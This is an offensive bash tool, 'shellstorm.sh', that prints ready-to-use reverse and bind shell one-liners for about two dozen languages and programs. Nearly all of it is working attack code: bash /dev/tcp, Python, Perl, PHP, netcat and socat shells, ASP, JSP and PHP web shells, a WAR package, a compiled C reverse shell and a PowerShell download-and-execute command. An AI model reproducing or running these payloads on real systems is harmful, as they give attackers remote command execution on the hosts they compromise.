#!/bin/bash

##########################################
# shellstorm.sh                          #
# reverse/bind one-liner shell generator #
#                          by 0bfxgh0st* #
##########################################

COL_BLUE="\e[0;32m"
COL_YELLOW="\e[0;33m"
COL_YELLOW_MARKDOWN="\e[1;33m"
COL_END="\e[0m"

function _HELP_(){

	printf "%s\n\n" "Usage bash shellstorm.sh <language/program> <ip> <port>"
	printf "%s\n" "Example:"
	printf "%s\n" "bash shellstorm.sh java 127.0.0.1 1337"
}

function _list_(){

	printf "\nLanguages:\n\n"
	printf "[${COL_BLUE}+${COL_END}] asp\n"
	printf "[${COL_BLUE}+${COL_END}] awk\n"
	printf "[${COL_BLUE}+${COL_END}] bash\n"
	printf "[${COL_BLUE}+${COL_END}] c\n"
	printf "[${COL_BLUE}+${COL_END}] cpan\n"
	printf "[${COL_BLUE}+${COL_END}] dart\n"
	printf "[${COL_BLUE}+${COL_END}] gawk\n"
	printf "[${COL_BLUE}+${COL_END}] golang\n"
        printf "[${COL_BLUE}+${COL_END}] groovy\n"
	printf "[${COL_BLUE}+${COL_END}] java\n"
        printf "[${COL_BLUE}+${COL_END}] jsp\n"
	printf "[${COL_BLUE}+${COL_END}] lua\n"
	printf "[${COL_BLUE}+${COL_END}] nc\n"
        printf "[${COL_BLUE}+${COL_END}] nc-nef\n"
	printf "[${COL_BLUE}+${COL_END}] nodejs\n"
	printf "[${COL_BLUE}+${COL_END}] openssl\n"
	printf "[${COL_BLUE}+${COL_END}] perl\n"
	printf "[${COL_BLUE}+${COL_END}] php\n"
	printf "[${COL_BLUE}+${COL_END}] php-daemon\n"
	printf "[${COL_BLUE}+${COL_END}] php-simple\n"
	printf "[${COL_BLUE}+${COL_END}] ps1\n"
	printf "[${COL_BLUE}+${COL_END}] ps1-ds\n"
	printf "[${COL_BLUE}+${COL_END}] python\n"
	printf "[${COL_BLUE}+${COL_END}] ruby\n"
	printf "[${COL_BLUE}+${COL_END}] sbd\n"
	printf "[${COL_BLUE}+${COL_END}] socat\n"
	printf "[${COL_BLUE}+${COL_END}] telnet\n"
        printf "[${COL_BLUE}+${COL_END}] war\n"


}

#################################### PROGRAMS/LANGUAGES FUNCTIONS ############################################

function _asp_(){

        payload=$(printf "\$client = New-Object System.Net.Sockets.TCPClient(\"$2\",$3);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close();" | iconv -t utf-16le | base64 -w 0)
        printf "<%%response.write CreateObject(\"WScript.Shell\").Exec(\"cmd /c powershell.exe -ExecutionPolicy Bypass -e $payload\").StdOut.Readall()%%>"
}


function _awk_(){

        printf "awk 'BEGIN {s = \"/inet/tcp/0/$2/$3\"; while(42) { do{ printf \"> \" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"

}

function _bash_(){

	printf "bash -c \"bash -i >& /dev/tcp/$2/$3 0>&1\"\n"
#	printf "bash -c \"bash -l > /dev/tcp/$2/$3 0<&1 2>&1\""
}

function _c_(){

cat <<EOF > /tmp/Cprog.c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = $3;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("$2");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}

EOF

}



function _cpan_(){
cat <<EOF
printf "y" | cpan && printf "! use Socket; my \\\$i=\"$2\"; my \\\$p=$3; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in(\\\$p,inet_aton(\\\$i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};" | cpan
EOF
}

function _dart_linux_(){
        echo "printf \"import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\\\"$2\\\", $3).then((socket) {\n    socket.listen((data) {\n      Process.start('/bin/bash', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}\n\" > /tmp/payload.dart && dart run /tmp/payload.dart"
}

function _gawk_(){
	printf "gawk 'BEGIN {P=$3;S=\"> \";H=\"$2\";V=\"/inet/tcp/0/\"H\"/\"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print \$0|&V;close(c)}}while(c!=\"exit\")close(V)}}'"
}


function _golang_(){
	printf "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$2:$3\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
}


function _groovy_linux_(){
        printf "groovy -e 'String host=\"$2\";int port=$3;String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'"
}


function _java_(){

	echo "printf 'import java.io.*;\n        public class LinuxRevShellExec {\n                public static void main(String[] args) {\n                try {\n                        String[] payload = {\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/$2/$3 0>&1\"};\n                        //String[] payload_b = {\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/$2/$3;cat <&5 | while read line; do \$line 2>&5 >&5; done\"};\n                        Process p = Runtime.getRuntime().exec(payload);\n                        BufferedReader in = new BufferedReader(\n                                new InputStreamReader(p.getInputStream()));\n                        String line = null;\n                         while ((line = in.readLine()) != null) {\n                                System.out.println(line);\n                        }\n                }\n             catch (IOException e) {\n                e.printStackTrace();\n                }\n        }\n}\n' > /tmp/payload.java && java /tmp/payload.java"

}

function _jsp_meta_(){
cat << EOF
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ip;
    OutputStream mU;

    StreamConnector( InputStream ip, OutputStream mU )
    {
      this.ip = ip;
      this.mU = mU;
    }

    public void run()
    {
      BufferedReader sc  = null;
      BufferedWriter wVX = null;
      try
      {
        sc  = new BufferedReader( new InputStreamReader( this.ip ) );
        wVX = new BufferedWriter( new OutputStreamWriter( this.mU ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = sc.read( buffer, 0, buffer.length ) ) > 0 )
        {
          wVX.write( buffer, 0, length );
          wVX.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( sc != null )
          sc.close();
        if( wVX != null )
          wVX.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "$2", $3 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

EOF
}

function _lua_linux_(){

        printf "%s" "lua -e \"require('os');os.execute('bash -c \\\"bash -i >& /dev/tcp/$2/$3 0>&1\\\"');\""
}

function _netcat_(){

	printf "nc -lvp $3 -e /bin/bash\n"
#	printf "nc -lvp $3 -e /bin/sh\n\n"
}


function _netcat_without_e_flag_(){

	printf "mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc $2 $3 1>/tmp/backpipe"

}


function _nodejs_(){
cat << EOF
echo "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/$2/$3 0>&1\"')" > /tmp/nd.js && nodejs /tmp/nd.js && rm /tmp/nd.js

EOF
#	printf "echo \"require('child_process').exec('nc -e /bin/sh $2 $3')\" > /tmp/nd.js && nodejs /tmp/nd.js && rm /tmp/nd.js\n\n"
}


function _openssl_(){

	printf "[${COL_YELLOW}+${COL_END}] Target payload\n\n"
        printf "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $2:$3 > /tmp/s; rm /tmp/s"
        printf "\n\n"

        printf "[${COL_BLUE}+${COL_END}] Creating ssl certs\n"
        openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes -subj "/C=UN/ST=Unknown/L=Unknown/O=Unk/CN=www.unknowsite.com"
        printf "\n"

        printf "[${COL_BLUE}+${COL_END}] Starting openssl server\n"
        printf "[${COL_BLUE}+${COL_END}] Listening in $3\n\n"
        printf "Openssl server waiting for incomming connection\n"
        openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port $3

}



function _perl_(){
	printf "perl -e 'use Socket;\$i=\"$2\";\$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
}

function _php_(){
        printf "php -r '\$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

}

function _php_web_simple_(){

cat <<EOF

<?php

if(isset(\$_REQUEST['cmd'])){
        echo "<pre>";
        \$cmd = (\$_REQUEST['cmd']);
        system(\$cmd);
        echo "</pre>";
        die;
}

?>

EOF

}


function _php_web_daemon_(){

cat <<EOF

<?php

set_time_limit (0);
\$VERSION = "1.0";
\$ip = "$2";
\$port = $3;
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; /bin/sh -i';
\$daemon = 0;
\$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        \$pid = pcntl_fork();

        if (\$pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if (\$pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        \$daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
if (!\$sock) {
        printit("\$errstr (\$errno)");
        exit(1);
}

// Spawn shell process
\$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

\$process = proc_open(\$shell, \$descriptorspec, \$pipes);

if (!is_resource(\$process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);

printit("Successfully opened reverse shell to \$ip:\$port");

while (1) {
        // Check for end of TCP connection
        if (feof(\$sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof(\$pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down \$sock, or some
        // command output is available on STDOUT or STDERR
        \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
        \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array(\$sock, \$read_a)) {
                if (\$debug) printit("SOCK READ");
                \$input = fread(\$sock, \$chunk_size);
                if (\$debug) printit("SOCK: \$input");
                fwrite(\$pipes[0], \$input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array(\$pipes[1], \$read_a)) {
                if (\$debug) printit("STDOUT READ");
                \$input = fread(\$pipes[1], \$chunk_size);
                if (\$debug) printit("STDOUT: \$input");
                fwrite(\$sock, \$input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array(\$pipes[2], \$read_a)) {
                if (\$debug) printit("STDERR READ");
                \$input = fread(\$pipes[2], \$chunk_size);
                if (\$debug) printit("STDERR: \$input");
                fwrite(\$sock, \$input);
        }
}

fclose(\$sock);
fclose(\$pipes[0]);
fclose(\$pipes[1]);
fclose(\$pipes[2]);
proc_close(\$process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit (\$string) {
        if (!\$daemon) {
                print "\$string\n";
        }
}

?> 



EOF

}



function _python_(){
	printf "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$2\",$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
}

function _ruby_(){
	printf "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$2\",\"$3\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
}


function _telnet_(){

	if [[ -z "$4" ]]
	then
		printf "Telnet shell needs two ports, one to send commands and the other one to receive I/O\n"
		printf "Enter one more port different\n\n"
		printf "Usage bash shellstorm.sh telnet <rhost> <rsendport> <rioport>\n"
		printf "Example: bash shellstorm.sh telnet 127.0.0.1 4444 4445\n"
		exit
	fi

        rhost="$2"
        rsendport="$3"
        rioport="$4"

        printf "telnet $rhost $rsendport | /bin/bash | telnet $rhost $rioport\n\n"
        printf "[${COL_YELLOW_MARKDOWN}!${COL_END}] Warning\n"
	printf "You need set up two netcat listeners\n"
        printf "One to send commands in port $rsendport\n"
        printf "The other one to receive stdout in port $rioport\n"

}


function _sbd_(){
	printf "sbd -lvp $3 -e /bin/bash\n"
#	printf "sbd -lvp $3 -e /bin/sh\n"
}

function _socat_(){
        printf "socat tcp-connect:$2:$3 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
}


function _ps1_(){
	printf "\$client = New-Object System.Net.Sockets.TCPClient(\"$2\",$3);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close();"
}

function _ps1_download_string_(){
	rfile="webshell.txt"
        printf "powershell -ExecutionPolicy Bypass -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://$2:$3/$rfile');\""
}

function _war_(){

rm -r /tmp/temp_war 2>/dev/null
mkdir /tmp/temp_war/
mkdir /tmp/temp_war/WEB-INF

_jsp_meta_ "$1" "$2" "$3" > /tmp/temp_war/payload.jsp

cat << EOF > /tmp/temp_war/WEB-INF/web.xml
<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
  <welcome-file-list>
    <welcome-file>payload.jsp</welcome-file>
  </welcome-file-list>
</web-app>
EOF

cd /tmp/temp_war/
jar -cvf payload.war payload.jsp WEB-INF
printf "\n[${COL_BLUE}+${COL_END}] war file compiled in /tmp/temp_war/payload.war\n"

}
############################################################################################## END PROGRAMS/LANGUAGES FUNCTIONS #


################################### ARGS HANDLERS ################################

if [[ "$1" == "php-simple" ]];                                       # first because is the only who use just one argument arg $1
then
#        printf "[ ${COL_BLUE}PHP web simple${COL_END} ] [(web)]\n\n"
	_php_web_simple_ "$1"
	exit
fi

if [[ -z "$1" ]] || [[ -z "$2" ]] || [[ -z "$3" ]]
then
	_HELP_
	_list_
	exit
fi


if [[ "$1" == "asp" ]];
then
#        printf "[ ${COL_BLUE}ASP${COL_END} ] [(web/reverse)]\n\n"
        _asp_ "$1" "$2" "$3"

elif [[ "$1" == "awk" ]];
then
#	printf "[ ${COL_BLUE}AWK${COL_END} ] [(reverse)]\n\n"
	_awk_ "$1" "$2" "$3"

elif [[ "$1" == "bash" ]];
then
#	printf "[ ${COL_BLUE}BASH${COL_END} ] [(reverse)]\n\n"
	_bash_ "$1" "$2" "$3"

elif [[ "$1" == "c" ]] || [[ "$1" == "C" ]];
then
#	printf "[ ${COL_BLUE}C${COL_END} ] [(reverse)]\n\n"
	_c_ "$1" "$2" "$3"
        gcc /tmp/Cprog.c -o /tmp/revshell
        cat /tmp/Cprog.c
	printf "[${COL_BLUE}+${COL_END}] Binary file is already compiled and stored in /tmp/revshell\n"


elif [[ "$1" == "cpan" ]];
then
#	printf "[ ${COL_BLUE}CPAN${COL_END} ] [(reverse)]\n\n"
        _cpan_ "$1" "$2" "$3"

elif [[ "$1" == "dart" ]];
then
#        printf "[ ${COL_BLUE}DART${COL_END} ] [(reverse)]\n\n"
        _dart_linux_ "$1" "$2" "$3"

elif [[ "$1" == "gawk" ]];
then
#	printf "[ ${COL_BLUE}GAWK${COL_END} ] [(reverse)]\n\n"
        _gawk_ "$1" "$2" "$3"

elif [[ "$1" == "golang" ]] || [[ "$1" == "go" ]] || [[ "$1" == "GOLANG" ]] || [[ "$1" == "GO" ]];
then
#	printf "[ ${COL_BLUE}GO${COL_END} ] [(reverse)]\n\n"
        _golang_ "$1" "$2" "$3"

elif [[ "$1" == "groovy" ]];
then
#        printf "[ ${COL_BLUE}GROOVY${COL_END} ] [(reverse)]\n\n"
        _groovy_linux_ "$1" "$2" "$3"

elif [[ "$1" == "java" ]];
then
#	printf "[ ${COL_BLUE}JAVA${COL_END} ] [(reverse)]\n\n"
        _java_ "$1" "$2" "$3"

elif [[ "$1" == "jsp" ]];
then
#        printf "[ ${COL_BLUE}JSP${COL_END} ] [(reverse)]\n\n"
        _jsp_meta_ "$1" "$2" "$3"

elif [[ "$1" == "lua" ]];
then
#        printf "[ ${COL_BLUE}LUA${COL_END} ] [(reverse)]\n\n"
        _lua_linux_ "$1" "$2" "$3"


elif [[ "$1" == "nc" ]];
then
#	printf "[ ${COL_BLUE}NETCAT${COL_END} ] [(bind)]\n\n"
        _netcat_ "$1" "$2" "$3"


elif [[ "$1" == "nc-nef" ]];
then
#       printf "[ ${COL_BLUE}NETCAT without -e flag${COL_END} ] [(reverse)]\n\n"
        _netcat_without_e_flag_ "$1" "$2" "$3"


elif [[ "$1" == "nodejs" ]];
then
#	printf "[ ${COL_BLUE}NODEJS${COL_END} ] [(reverse)]\n\n"
        _nodejs_ "$1" "$2" "$3"


elif [[ "$1" == "openssl" ]];
then
#        printf "[ ${COL_BLUE}OPENSSL${COL_END} ] [(reverse)]\n\n"
        _openssl_ "$1" "$2" "$3"

elif [[ "$1" == "perl" ]];
then
#	printf "[ ${COL_BLUE}PERL${COL_END} ] [(reverse)]\n\n"
        _perl_ "$1" "$2" "$3"

elif [[ "$1" == "php" ]];
then
#	printf "[ ${COL_BLUE}PHP${COL_END} ] [(reverse)]\n\n"
        _php_ "$1" "$2" "$3"

elif [[ "$1" == "php-daemon" ]];
then
 #       printf "[ ${COL_BLUE}PHP web daemon${COL_END} ] [(web/reverse)]\n\n"
        _php_web_daemon_ "$1" "$2" "$3"

elif [[ "$1" == "python" ]];
then
#	printf "[ ${COL_BLUE}PYTHON${COL_END} ] [(reverse)]\n\n"
        _python_ "$1" "$2" "$3"


elif [[ "$1" == "ruby" ]];
then
#	printf "[ ${COL_BLUE}RUBY${COL_END} ] [(reverse)]\n\n"
        _ruby_ "$1" "$2" "$3"


elif [[ "$1" == "sbd" ]];
then
#        printf "[ ${COL_BLUE}SBD${COL_END} ] [(bind)]\n\n"
        _sbd_ "$1" "$2" "$3"


elif [[ "$1" == "socat" ]];
then
#	printf "[ ${COL_BLUE}SOCAT${COL_END} ] [(reverse)]\n\n"
        _socat_ "$1" "$2" "$3"


elif [[ "$1" == "telnet" ]];
then
#        printf "[ ${COL_BLUE}TELNET${COL_END} ] [(reverse)]\n\n"
	_telnet_ "$1" "$2" "$3" "$4"

elif [[ "$1" == "ps1" ]];
then
#	printf "[ ${COL_BLUE}PS1${COL_END} ] [(reverse)]\n\n"
        _ps1_ "$1" "$2" "$3"


elif [[ "$1" == "ps1-ds" ]];
then
#        printf "[ ${COL_BLUE}PS1 DownloadString${COL_END} ] [(reverse)]\n\n"
	_ps1_download_string_ "$1" "$2" "$3"

elif [[ "$1" == "war" ]];
then
#        printf "[ ${COL_BLUE}WAR${COL_END} ] [(reverse)]\n\n"
        _war_ "$1" "$2" "$3"

else
	printf "Language/Program $1 no available\n"
fi
